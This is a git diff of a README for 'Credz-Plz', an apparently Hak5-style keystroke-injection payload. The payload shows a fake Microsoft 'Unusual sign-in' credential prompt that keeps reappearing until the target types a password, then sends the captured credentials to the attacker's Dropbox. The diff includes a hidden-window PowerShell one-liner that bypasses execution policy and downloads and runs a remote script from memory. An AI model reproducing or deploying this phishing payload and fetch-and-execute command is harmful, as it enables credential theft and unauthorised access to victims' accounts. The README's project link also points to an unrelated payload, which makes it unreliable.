@@ -1,4 +1,4 @@
-![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/OMG-AcidBurn/logo-170-px.png?raw=true)
+![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/Assets/logo-170-px.png?raw=true)
 
 <!-- TABLE OF CONTENTS -->
 <details>
@@ -13,33 +13,34 @@
   </ol>
 </details>
 
-# RD-PineApple
+# Credz-Plz
 
-A script used to connect a targets PC to your wifi PineApple using the Rubber Ducky
+A script used to prompt the target to enter their creds to later be exfiltrated with dropbox.
 
 ## Description
 
-This program will use the Rubber Ducky to connect target pc to your Wifi PineApples wireless access point
-It will generate an XML file that will be used to create a network profile for your Wifi PineApple. 
-Depending on your method of execution the XML file will either be manually entered into a powershell window 
-or you may use and Invoke Web-Request to download a script to add the network profile. After either the history of
-the powershell window and run box will be erased for a clean exit. 
+A pop up box will let the target know "Unusual sign-in. Please authenticate your Microsoft Account"
+This will be followed by a fake authentication ui prompt. 
+If the target tried to "X" out, hit "CANCEL" or while the password box is empty hit "OK" the prompt will continuously re pop up 
+Once the target enters their credentials their information will be uploaded to your dropbox for collection 
+
+![alt text](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/OMG/Payloads/OMG-Credz-Plz/unusual-sign-in.jpg)
+
+![alt text](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/OMG/Payloads/OMG-Credz-Plz/sign-in.jpg)
 
 ## Getting Started
 
 ### Dependencies
 
-* DropBox or another File Hosting service - Your Shared link for the intended file
+* DropBox or other file sharing service - Your Shared link for the intended file
 * Windows 10,11
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
 ### Executing program
 
-* Plug in RubberDucky
-* Either the entire script will be manually entered into the powershell window or
+* Plug in your device
 * Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
-* PS1 file to download is provided above
 ```
 powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link for the intended file> ?dl=1; invoke-expression $pl
 ```
@@ -85,7 +86,7 @@ I am Jakoby
     <img src="https://img.shields.io/badge/YouTube-I_am_Jakoby-red">
   </a>
 
-  Project Link: [https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/RD-PineApple)
+  Project Link: [https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG/Payloads/OMG-ADV-Recon)
 </p>
 
 
@@ -97,7 +98,5 @@ I am Jakoby
 
 * [Hak5](https://hak5.org/)
 * [MG](https://github.com/OMG-MG)
-
-
 
 <p align="right">(<a href="#top">back to top</a>)</p>
